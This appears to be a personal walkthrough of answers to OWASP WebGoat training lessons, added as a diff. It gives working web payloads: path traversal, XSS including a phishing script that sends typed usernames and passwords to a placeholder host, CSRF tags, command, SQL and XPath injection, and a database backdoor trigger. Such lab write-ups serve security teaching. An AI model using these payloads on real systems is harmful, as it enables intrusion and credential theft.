@@ -1,0 +1,187 @@
+Start OWASP Proxy and open a browser (I am using firefox) that is preconfigured to send traffic via ZAP.
+
+
+1. Access Control Flaws:
+  1.1 Using an Access Control Matrix:
+  A.   Set break point on your ZAP for all traffic by clicking the green round button
+       Check access through user "Shemp" and you are done
+
+  1.2 Bypass a Path based access Control Scheme
+  A.  Set break point on ZAP.
+      Change the variable "File" in your request that is sent to the server to
+      "../../../../../WEB-INF/spring-security.xml"
+
+  1.3 Bypass Business layer access Control
+  A.  For starters, the password for user "Tom Cat" would be "tom"
+      Log in as "Larry Stooge" with password "larry"
+      Using ZAP, change the "employee_ID" to "105" as this is the ID of "Tom Cat"
+      Change the "action" parameter to "DeleteProfile". This will delete Tom Cat's
+      profile.
+
+2. Ajax security:
+   2.1 DOM Injection
+   A.  Write anything in the box in front of "License Key"
+       When you intercept the traffic from server replace the body with
+       "document.form.SUBMIT.disabled=false".
+       You may to have to do this on all the replies that you intercept from the server
+   2.2 DOM-Based cross-site scripting
+   A.  Stage1: <img src="images/logos/owasp.jpg"/>
+       Stage2: <img src=x onerror=;;alert('XSS')/>
+       Stage3: <iframe src="javascript:alert('XSS');"/>
+       Stage4: Enter the html script showed
+       Stage5: Only available for developer version
+   2.3 XML Injection
+   A.  Intercept the traffic towards the server and change the parameters:
+       "check1001" to "check1004" or "check1005"
+   2.4 JSON Injection
+   A.  Select the flight with 0 stops.
+       Intercept the traffic going towards server and
+       change the "price2Submit" to "$300".
+   2.5 Silent Transactions Attacks
+   A.  Write "javascript:submitData(1234566,11000)".
+       However this will not totally work. Modern browsers do not let you
+       execute javascript from address bar. But you still will get the green check
+       mark for completion.
+   2.6 Insecure Client Storage
+   A.  Find the javascript code in the html that is responsible for the coupon code.
+       Function decrypt(code) is the code you should be looking at. This will be tricky
+       in Firefox browser, so you may need Chrome or better go for Edge.
+       In MS Edge, just "inspect" the box for coupon code. and then in "debugger" tab
+       search for "isValidCode" and put the break on line with variable "decrypted".
+       Write anything in the box for coupon and once the breakpoint is hit, hove mouse
+       over "decrypted" and you will get your answer.
+       The point here is that the Javascript "clientSideValidation.js" is sent over as
+       a variable/string to an eval() function. That is why you will not be able to see
+       it in the normal rendered javascripts.
+       You can still find the code in Chrome by going to the console and type
+       "isValidCoupon". You can see three dots in the end of the code, click them and
+       voila, you can see the code. Put the break point and carry on as described above.
+       There is an extremely simple way in Firefox to this problem. Look at the code by
+       copying the full address from the rendered HTML code and you would figure out
+       that the variable "decrypted". If you just write the variable in the console,
+       it will show the value that is the answer. In my case it is "PRESSTWO".
+       Next step requires you to make the order free. The way I did it, was to Intercept
+       the traffic with ZAP, change the value to 0.00 of variable "f.FRANDTOT.value".
+   2.7 Same Origin Policy Protection
+   A.  Just copy paste the two URLs that are given on the page. URL starting with "/WebGoat"
+       will return a valid response and will be displayed in the "Response" box.
+
+3. Authentication Flaws:
+   3.1 Password Strength
+   A.  Just check the time to crack for the passwords in the list. Mind that answers you
+       will get will be different from the real answers (probably due to increase in CPU
+       power overtime).
+   3.2 Forgot password
+   A.  The account you should recover the password from is "admin" and fav color is "green"
+   3.3 Multi Level Login 1
+   A.  Just input the username, password and first TAN. You can see in the intercepted
+       traffic that TAN number is also sent. This is the weakness. In the second stage,
+       change the TAN value to 1 and enter 1st TAN.
+   3.4 Multi Level Login 2
+   A.  Enter Joe's username and password. On the next page, enter Joe's TAN and intercept
+       the traffic. IN the parameters change the name from Joe to Jane. You are done.
+
+4. Buffer Overflows:
+   4.1 Here, you need to overflow the buffer for room number. Buffers (if vulnerable) can
+   be overflowed by 1024, 2048 or 4096 characters. Then check the hidden fields in the last
+   page and you will find a list of people. Enter "Jonathan Ravern 4321" by restarting the
+   lesson and this is the answer.
+
+5. Code Quality:
+   5.1 Just inspect the username element and you can see the username "admin" and password
+   "adminpw" in the html.
+
+6. Concurrency
+   6.1 Enter "jeff" and "dave" in the same box by opening this page in two separate browsers
+       keep clicking fast and you will see that both windows may display same information.
+   6.2 This is more like a fast clicking exercise. Open up the same page in two browsers.
+       In browser A, select a cheap item and in browser B select an expensive one. Update
+       the orders. Then purchase the order in cheaper one and confirm the order in the
+       expensive one. Do it multiple times and you may get lucky to exploit the
+       concurrency vulnerability.
+
+7. Cross-Site Scripting (XSS)
+   7.1 Phishing with XSS
+   A.  Write the following query in the search windows(without quotes):
+        "</form>
+        <script>
+        function hack(){
+        XSSImage=new Image;
+        XSSImage.src="http://xxx.xxx.xxx.xxx:8080/WebGoat/catcher?PROPERTY=yes&user=" + document.phish.user.value + "&password=" + document.phish.pass.value + "";
+        alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);
+        }
+        </script>
+        <form name="phish">
+        <HR>
+        <H2>This feature requires account login:</H2>
+        Enter Username:<input type="text" name="user" ><br>
+        Enter Password: <input type="password" name = "pass"><br>
+        <input type="submit" name="login" value="login" on-click="hack()">"
+       I have got this answer from the solution and I not sure how can this be used as
+       an attack. The query is sent as part of the HTML body and NOT as part of URL.
+       All a user may see is a URL to an page WITHOUT the poisoned query. This attack
+       may work in case where an html code is injected and then the username/password
+       are sent to a remote server.
+   7.2 Stored XSS Attacks:
+   A.  Enter "<script>alert('XSSTitle');</script>" in the title bar and "<script>alert('XSSBody');</script>"
+       in the message body. You will see the title bar pops up.
+   7.2.1 Stage 1
+   A.    Log in as Tom and search for Jerry, put "<script>alert('XSS');</script>"
+         in the street field.
+   7.2.2 Stage 3
+   A.    Log in as "David"(password = 'david') and visit Bruce profile. XSS
+         should pop up.
+   7.2.3 Stage 5 (Reflected XSS)
+   A.    Enter "<script>alert('XSS');</script>" in the search bar
+   7.3 Reflected XSS
+   A.  Enter "<script>alert('XSS');</script>" in the all input fields. Last
+       one pops up.
+   7.4 CSRF
+   A.  Insert any text in the Title and Enter "<img src=http://XXX.XXX.XXX.XXX:8080/WebGoat/attack?Screen={insert the screen value}&menu={Insert menu value}&transferFunds=50000>"
+       in the search bar" in the message.
+   7.5 CSRF Prompt By-Pass
+   A.  Insert any text in the Title and Enter "<img src=http://XXX.XXX.XXX.XXX:8080/WebGoat/attack?Screen={insert the screen value}&menu={Insert menu value}&transferFunds=50000/>"
+       and "<img src=http://XXX.XXX.XXX.XXX:8080/WebGoat/attack?Screen={insert the screen value}&menu={Insert menu value}&transferFunds=CONFIRM/>"
+       in the search bar" in the message.
+   7.6 CSRF Token By-Pass
+   A.
+   7.7 HTTPOnly Test
+   A.  Click "Read Cookie" and "Write Cookie" button for both "Yes" and "No" options.
+
+8. Improper Error Handling
+   8.1 Fail Open Authentication Scheme
+   A.  Enter "Admin" user name and anything in the password, then press submit.
+       Intercept the message and delete the password value from parameters.
+       You will be logged in.
+
+9. Injection Flaws
+   9.1 Command Injection
+   A.  Select any lesson plan and intercept the traffic. Change the parameters
+       by overwriting the "HelpFile" value with ""; ls;#".
+   9.2 Numerical SQL Injection
+   A.  This is like a simple SQL injection. Intercept the traffic and replace
+       parameter with "101 or 1=1;--" without quotes.
+   9.3 Log Spoofing
+   A.  Insert carriage return and write on the new line by:
+       Waqar%0d%0aLogin Successful for user: Admin
+   9.4 XPATH Injection
+   A.  This is very similar to SQL injection. Entering the following will complete
+       the lesson: "Mike' or 1=1 or 'a'='a". Make sure there is no closing coma
+       after the second "a". The reason that there are two ORs in this injection
+       is because the XPATH interprets it as:
+       expression="/employees/employee[(loginID/text()='Smith' or 1=1) OR ('a'='a' and passwd/text()='password')]"
+   9.5 String SQL injection
+   A.  This is a standard SQL Injection flaw. Enter "Smith' or 'a'='a" without quotes
+   9.6 LAB: SQL Injection (Stage 1)
+   A.  Select Neville as user name and put "Anything' or 'a'='a" as password.
+   9.7 LAB: SQL Injection (Stage 3)
+   A.  No Solution could be figured WITHOUT
+   9.8 Database Backdoors
+   A.  First Step: enter "101" without quotes and check your data.
+       Second: Enter "101; UPDATE employee SET Salary=100000 WHERE userid=101"
+       This will update the row entry in database.
+       Stage 2: CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='hacker@email.com' WHERE userd=NEW.userid
+   9.9 Blind Numeric SQL injection
+       Start with "101 AND 1=2"
+       Final Answer: "101 and ((SELECT pin FROM pins WHERE cc_number='111122223333') > 10000);"
+       "101 and ((SELECT pin FROM pins WHERE cc_number='111122223333') = 2364);"
